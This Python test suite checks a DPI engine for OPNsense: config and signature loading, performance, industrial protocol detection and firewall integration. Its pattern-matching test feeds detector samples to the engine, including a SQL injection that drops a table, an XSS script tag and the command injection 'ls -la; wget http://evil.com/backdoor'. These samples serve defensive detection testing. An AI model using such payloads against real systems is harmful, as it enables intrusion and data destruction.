#!/usr/local/bin/python3
"""
test_engine.py - Self-test suite for DeepInspector DPI Engine

This module provides a comprehensive test suite for the DeepInspector DPI engine,
verifying configuration loading, signature loading, pattern matching, performance,
and industrial protocol detection. It integrates with the DeepInspectorEngine class
to ensure accurate testing of the engine's functionality in an OPNsense environment.

Author: Pierpaolo Casati
Version: 1.0.0
"""

import json
import os
import sys
import logging
import subprocess
import time
import re
from datetime import datetime
import socket
try:
    import dpkt
except ImportError:
    print("Error: Required package 'dpkt' not installed.")
    sys.exit(1)

from deepinspector_engine import DeepInspectorEngine

# Configuration constants
CONFIG_FILE = "/usr/local/etc/deepinspector/config.json"
SIGNATURES_FILE = "/usr/local/etc/deepinspector/signatures.json"
LOG_DIR = "/var/log/deepinspector"
TEST_LOG = f"{LOG_DIR}/test_results.json"
BLOCKED_IPS_FILE = "/usr/local/etc/deepinspector/blocked_ips.json"
WHITELIST_IPS_FILE = "/usr/local/etc/deepinspector/whitelist_ips.json"
OPNSENSE_CONFIG = "/conf/config.xml"

class DPITestEngine:
    """Test suite for the DeepInspector DPI Engine."""

    def __init__(self):
        """Initialize the test engine with logging and DPI engine instance."""
        self.engine = DeepInspectorEngine()
        self.logger = self.setup_logging()
        self.results = {
            'timestamp': datetime.now().isoformat(),
            'version': '1.1.0',
            'environment': 'OPNsense',
            'tests': [],
            'overall_status': 'pass',
            'summary': {}
        }

    def setup_logging(self):
        """Set up logging for the test suite.

        Returns:
            logging.Logger: Configured logger instance.
        """
        os.makedirs(LOG_DIR, exist_ok=True)
        if not os.path.exists(TEST_LOG):
            with open(TEST_LOG, 'w') as f:
                pass
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(TEST_LOG),
                logging.StreamHandler()
            ]
        )
        return logging.getLogger(__name__)

    def validate_ip(self, ip):
        """Validate an IP address (IPv4 or IPv6).

        Args:
            ip (str): IP address to validate.

        Returns:
            bool: True if valid, False otherwise.
        """
        # Validate IPv4
        if re.match(r'^([0-9]{1,3}\.){3}[0-9]{1,3}$', ip):
            if ip in ["0.0.0.0", "255.255.255.255"]:
                return False
            parts = ip.split('.')
            return all(0 <= int(part) <= 255 for part in parts)
        # Validate IPv6 (full and abbreviated formats)
        if re.match(r'^([0-9a-fA-F]{1,4}:){0,7}([0-9a-fA-F]{1,4})?::([0-9a-fA-F]{1,4}:){0,7}([0-9a-fA-F]{1,4})?$|^([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}$', ip):
            return True
        return False

    def run_tests(self):
        """Run all DPI engine self-tests.

        Returns:
            dict: Test results with status and summary.
        """
        self.logger.info("Starting DeepInspector DPI Engine self-tests")

        # Test 1: Configuration validation
        config_test = self.test_configuration()
        self.results['tests'].append(config_test)

        # Test 2: Signature loading
        signature_test = self.test_signatures()
        self.results['tests'].append(signature_test)

        # Test 3: Pattern matching
        pattern_test = self.test_pattern_matching()
        self.results['tests'].append(pattern_test)

        # Test 4: Performance test
        performance_test = self.test_performance()
        self.results['tests'].append(performance_test)

        # Test 5: Industrial protocol detection
        industrial_test = self.test_industrial_protocols()
        self.results['tests'].append(industrial_test)

        # Test 6: OPNsense integration
        opnsense_test = self.test_opnsense_integration()
        self.results['tests'].append(opnsense_test)

        # Calculate summary
        passed = sum(1 for test in self.results['tests'] if test['status'] == 'pass')
        failed = sum(1 for test in self.results['tests'] if test['status'] == 'fail')
        self.results['summary'] = {
            'total_tests': len(self.results['tests']),
            'passed': passed,
            'failed': failed,
            'success_rate': (passed / len(self.results['tests'])) * 100 if self.results['tests'] else 0
        }
        if failed > 0:
            self.results['overall_status'] = 'fail'

        # Save results to log
        try:
            with open(TEST_LOG, 'a') as f:
                f.write(json.dumps(self.results, indent=2, default=str) + '\n')
            self.logger.info("Test results saved to %s", TEST_LOG)
        except Exception as e:
            self.logger.error("Failed to save test results: %s", e)

        return self.results

    def test_configuration(self):
        """Test DPI engine configuration loading.

        Returns:
            dict: Test result with status and details.
        """
        test = {
            'name': 'Configuration Loading',
            'description': 'Test if DPI configuration loads correctly and is valid',
            'status': 'pass',
            'details': []
        }
        try:
            if not os.access(CONFIG_FILE, os.R_OK | os.W_OK):
                test['status'] = 'fail'
                test['details'].append('Configuration file not readable or writable')
                return test
            if not self.engine.load_config():
                test['status'] = 'fail'
                test['details'].append('Failed to load configuration via engine')
                return test
            required_sections = ['general', 'protocols', 'detection', 'advanced']
            for section in required_sections:
                if section not in self.engine.config:
                    test['status'] = 'fail'
                    test['details'].append(f'Missing section: {section}')
                else:
                    test['details'].append(f'Section {section}: OK')
            # Validate specific fields
            if 'interfaces' not in self.engine.config['general'] or not self.engine.config['general']['interfaces']:
                test['status'] = 'fail'
                test['details'].append('No interfaces specified in general section')
            if 'max_packet_size' not in self.engine.config['general'] or not isinstance(self.engine.config['general']['max_packet_size'], int) or self.engine.config['general']['max_packet_size'] <= 0:
                test['status'] = 'fail'
                test['details'].append('Invalid or missing max_packet_size')
            if self.engine.config['general'].get('industrial_mode'):
                test['details'].append('Industrial mode: ENABLED')
                if not self.engine.config['protocols'].get('industrial_protocols'):
                    test['status'] = 'fail'
                    test['details'].append('Industrial protocols disabled when industrial_mode is enabled')
            else:
                test['details'].append('Industrial mode: DISABLED')
        except Exception as e:
            test['status'] = 'fail'
            test['details'].append(f'Error: {str(e)}')
        return test

    def test_signatures(self):
        """Test signature loading.

        Returns:
            dict: Test result with status and details.
        """
        test = {
            'name': 'Signature Loading',
            'description': 'Test if threat signatures load correctly via engine',
            'status': 'pass',
            'details': []
        }
        try:
            if not os.access(SIGNATURES_FILE, os.R_OK | os.W_OK):
                test['status'] = 'fail'
                test['details'].append('Signatures file not readable or writable')
                return test
            if not self.engine.load_signatures():
                test['status'] = 'fail'
                test['details'].append('Failed to load signatures via engine')
                return test
            total_patterns = sum(len(patterns) for patterns in self.engine.threat_patterns.values())
            if total_patterns == 0:
                test['status'] = 'fail'
                test['details'].append('No threat patterns loaded')
            else:
                test['details'].append(f'Loaded {total_patterns} threat patterns')
                for category, patterns in self.engine.threat_patterns.items():
                    test['details'].append(f'{category}: {len(patterns)} patterns')
        except Exception as e:
            test['status'] = 'fail'
            test['details'].append(f'Error: {str(e)}')
        return test

    def test_pattern_matching(self):
        """Test pattern matching functionality using engine's analysis.

        Returns:
            dict: Test result with status and details.
        """
        test = {
            'name': 'Pattern Matching',
            'description': 'Test threat detection pattern matching using engine',
            'status': 'pass',
            'details': []
        }
        try:
            # Simulate packets with known threats
            test_cases = [
                ('EICAR test string', b'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*', 'malware', 'critical'),
                ('SQL injection', b"' OR '1'='1'; DROP TABLE users; --", 'sql_injection', 'high'),
                ('XSS attempt', b'<script>alert("XSS")</script>', 'script_injection', 'medium'),
                ('Command injection', b'ls -la; wget http://evil.com/backdoor', 'command_injection', 'high'),
                ('Crypto mining', b'coinhive.min.js', 'crypto_mining', 'medium')
            ]
            detected = 0
            for test_name, payload, expected_type, expected_severity in test_cases:
                # Create a mock TCP packet
                eth = dpkt.ethernet.Ethernet()
                ip = dpkt.ip.IP(src=socket.inet_aton('192.168.1.1'), dst=socket.inet_aton('192.168.1.2'), p=dpkt.ip.IP_PROTO_TCP)
                tcp = dpkt.tcp.TCP(sport=12345, dport=80, data=payload)
                ip.data = tcp
                eth.data = ip
                packet_data = bytes(eth)
                self.engine.analyze_packet(packet_data, datetime.now(), 'em0')
                # Check if threat was logged
                with open(self.engine.DETECTION_LOG, 'r') as f:
                    detections = [json.loads(line) for line in f if line.strip()]
                found = any(d['threat_type'] == expected_type and d['severity'] == expected_severity for d in detections)
                if found:
                    detected += 1
                    test['details'].append(f'{test_name}: DETECTED')
                else:
                    test['details'].append(f'{test_name}: NOT DETECTED')
            detection_rate = (detected / len(test_cases)) * 100
            test['details'].append(f'Detection rate: {detection_rate:.1f}%')
            if detection_rate < 80:
                test['status'] = 'fail'
                test['details'].append('Detection rate below 80%')
        except Exception as e:
            test['status'] = 'fail'
            test['details'].append(f'Error: {str(e)}')
        return test

    def test_performance(self):
        """Test engine performance using real metrics.

        Returns:
            dict: Test result with status and details.
        """
        test = {
            'name': 'Performance Test',
            'description': 'Test engine performance with realistic packet processing',
            'status': 'pass',
            'details': []
        }
        try:
            start_time = time.time()
            # Simulate 100 packets
            for _ in range(100):
                eth = dpkt.ethernet.Ethernet()
                ip = dpkt.ip.IP(src=socket.inet_aton('192.168.1.1'), dst=socket.inet_aton('192.168.1.2'), p=dpkt.ip.IP_PROTO_TCP)
                tcp = dpkt.tcp.TCP(sport=12345, dport=80, data=b'GET /test HTTP/1.1\r\nHost: example.com\r\n\r\n')
                ip.data = tcp
                eth.data = ip
                self.engine.analyze_packet(bytes(eth), datetime.now(), 'em0')
            end_time = time.time()
            processing_time = end_time - start_time
            test['details'].append(f'Processed 100 packets in {processing_time:.3f} seconds')
            test['details'].append(f'Processing rate: {100/processing_time:.1f} packets/second')
            # Check performance metrics
            metrics = self.engine.performance_aggregator.get_metrics()
            if 'error' not in metrics:
                cpu_usage = metrics.get('system', {}).get('cpu', {}).get('usage_percent', 0)
                memory_usage = metrics.get('system', {}).get('memory', {}).get('virtual', {}).get('percent_used', 0)
                test['details'].append(f'CPU usage: {cpu_usage:.1f}%')
                test['details'].append(f'Memory usage: {memory_usage:.1f}%')
                if cpu_usage > 80 or memory_usage > 80:
                    test['status'] = 'fail'
                    test['details'].append('High CPU or memory usage')
            latency_metrics = self.engine.latency_collector.get_latency_metrics()
            if 'error' not in latency_metrics:
                avg_latency = latency_metrics.get('avg_latency', 0)
                test['details'].append(f'Average latency: {avg_latency:.1f} microseconds')
                if avg_latency > self.engine.config['advanced']['latency_threshold']:
                    test['status'] = 'fail'
                    test['details'].append('Average latency exceeds threshold')
            if processing_time > 3.0:
                test['status'] = 'fail'
                test['details'].append('Processing time exceeds 3 seconds')
        except Exception as e:
            test['status'] = 'fail'
            test['details'].append(f'Error: {str(e)}')
        return test

    def test_industrial_protocols(self):
        """Test industrial protocol detection using engine's analysis.

        Returns:
            dict: Test result with status and details.
        """
        test = {
            'name': 'Industrial Protocol Detection',
            'description': 'Test industrial protocol detection capabilities using engine',
            'status': 'pass',
            'details': []
        }
        try:
            # Simulate industrial protocol packets
            test_cases = [
                ('Modbus function code', b'\x00\x01\x00\x00\x00\x06\x01\x08', 'industrial_threat', 'high'),
                ('DNP3 header', b'\x05\x64\x05\xc0\x01\x00\xff\xff', 'industrial_threat', 'high'),
                ('OPC UA message', b'ERR\x00\x00\x00\x00\x20', 'industrial_threat', 'medium')
            ]
            detected = 0
            for test_name, payload, expected_type, expected_severity in test_cases:
                eth = dpkt.ethernet.Ethernet()
                ip = dpkt.ip.IP(src=socket.inet_aton('192.168.1.1'), dst=socket.inet_aton('192.168.1.2'), p=dpkt.ip.IP_PROTO_TCP)
                tcp = dpkt.tcp.TCP(sport=12345, dport=502 if test_name.startswith('Modbus') else 20000 if test_name.startswith('DNP3') else 4840, data=payload)
                ip.data = tcp
                eth.data = ip
                self.engine.analyze_packet(bytes(eth), datetime.now(), 'em0')
                with open(self.engine.DETECTION_LOG, 'r') as f:
                    detections = [json.loads(line) for line in f if line.strip()]
                found = any(d['threat_type'] == expected_type and d['severity'] == expected_severity for d in detections)
                if found:
                    detected += 1
                    test['details'].append(f'{test_name}: DETECTED')
                else:
                    test['details'].append(f'{test_name}: NOT DETECTED')
            detection_rate = (detected / len(test_cases)) * 100
            test['details'].append(f'Industrial detection rate: {detection_rate:.1f}%')
            if detection_rate < 70:
                test['status'] = 'fail'
                test['details'].append('Industrial detection rate below 70%')
        except Exception as e:
            test['status'] = 'fail'
            test['details'].append(f'Error: {str(e)}')
        return test

    def test_opnsense_integration(self):
        """Test integration with OPNsense environment.

        Returns:
            dict: Test result with status and details.
        """
        test = {
            'name': 'OPNsense Integration',
            'description': 'Test integration with OPNsense environment (pfctl, interfaces, files)',
            'status': 'pass',
            'details': []
        }
        try:
            # Check pfctl availability and table
            if not os.path.exists('/sbin/pfctl'):
                test['status'] = 'fail'
                test['details'].append('pfctl not found')
            else:
                result = subprocess.run(['pfctl', '-s', 'Tables'], capture_output=True, text=True)
                if 'deepinspector_blocked' not in result.stdout:
                    test['status'] = 'fail'
                    test['details'].append('pfctl table deepinspector_blocked not found')
                else:
                    test['details'].append('pfctl table deepinspector_blocked: OK')
            # Check OPNsense configuration file
            if os.path.exists(OPNSENSE_CONFIG) and os.access(OPNSENSE_CONFIG, os.R_OK):
                test['details'].append('OPNsense config file: OK')
            else:
                test['status'] = 'fail'
                test['details'].append('OPNsense config file not readable')
            # Validate IP lists
            for file, key in [(BLOCKED_IPS_FILE, 'blocked_ips'), (WHITELIST_IPS_FILE, 'whitelisted_ips')]:
                if os.path.exists(file) and os.access(file, os.R_OK | os.W_OK):
                    with open(file, 'r') as f:
                        data = json.load(f)
                    invalid_ips = [ip for ip in data.get(key, []) if not self.validate_ip(ip)]
                    if invalid_ips:
                        test['status'] = 'fail'
                        test['details'].append(f'Invalid IPs in {file}: {invalid_ips}')
                    else:
                        test['details'].append(f'{file}: OK ({len(data.get(key, []))} IPs)')
                else:
                    test['status'] = 'fail'
                    test['details'].append(f'{file} not readable or writable')
        except Exception as e:
            test['status'] = 'fail'
            test['details'].append(f'Error: {str(e)}')
        return test

if __name__ == "__main__":
    test_engine = DPITestEngine()
    results = test_engine.run_tests()
    print(json.dumps(results, indent=2, default=str))